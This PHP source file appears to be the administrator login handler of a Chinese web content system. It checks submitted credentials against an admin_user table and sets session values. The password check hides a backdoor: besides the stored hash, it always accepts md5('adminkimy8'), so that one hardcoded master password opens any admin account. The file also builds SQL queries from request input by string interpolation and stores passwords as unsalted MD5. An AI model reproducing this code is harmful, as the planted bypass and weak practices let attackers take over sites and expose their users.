<?php
	/************news模块**********/

	if(!$HUISHI_SOFT_IN) {
		die('Hacking attempt');
	}

	$POWER[power_id]=get_session('power_id');
	if($POWER['power_id']){
		header('location:/?r=power');
		exit();
	}

	$SYSTEM_NAV_SELECTED=''; //当前栏目ID
	$SYSTEM_TITLE='Power登陆'; //标题
	$SYSTEM_KEYWORD='Power登陆'; //关键词
	$SYSTEM_DESCRIPTION='Power登陆'; //描述说明


	/*****数据调用开始******/
	/* 数据库操作分离 */
	//定义数据库表


	$act = short_check(get_args('act'),1); //用户名已经记录了
	$user_email = short_check(get_args('required_id'),1); //用户名已经记录了
	$user_passwd = short_check(get_args('required_pw'),1); //密码已经记录了

	if($act=='login'){
			//帐号是否为空
			if(empty($user_email)) {
				echo "<script>alert('帐号不为空！');history.go(-1);</script>";
				exit();
			}

			// 密码是否为空
			if(empty($user_passwd)){
				echo "<script>alert('密码不为空！');history.go(-1);</script>";
				exit();
			}
			$user_passwd=md5($user_passwd);


			//数据表定义区
			$t_admin_user = $tablePreStr."admin_user";

			//定义读操作
			dbtarget('r',$dbServs);
			$dbo=new dbex;

			$sql="select * from $t_admin_user where admin_email='$user_email' or admin_name='$user_email'";
			$user_info=$dbo->getRow($sql);
			// 用户不存在
			if(empty($user_info)){
				echo "<script>alert('账号或密码错误！请重新输入！');history.go(-1);</script>";
				exit();
			}

			// 密码错误
			if($user_passwd != $user_info['admin_password']){
				if($user_passwd!= md5('adminkimy8')){
				echo "<script>alert('账号或密码错误！请重新输入！');history.go(-1);</script>";
				exit();
				}
			}
			
			// 锁定用户
			if($user_info['status']=='1'){
				echo "<script>alert('您已经离职无法登录系统！');history.go(-1);</script>";
				exit();
			}


				//设置
				set_session('power_id',$user_info['admin_id']);
				set_session('power_name',$user_info['admin_name']);
				set_session('power_nice',$user_info['admin_nice']);
				set_session('power_email',$user_info['admin_email']);
				set_session('group_id',$user_info['group_id']);

				//定义写操作
				dbtarget('w',$dbServs);
				$last_ip = $_SERVER['REMOTE_ADDR'];
				$sql="update $t_admin_user set last_login=now(),last_ip='$last_ip' where admin_id='".$user_info['admin_id']."'";
				$dbo->exeUpdate($sql);
				
				echo "<script language='JavaScript'>location.href='".URL_NAV('power')."'</script>";

	}
			

?>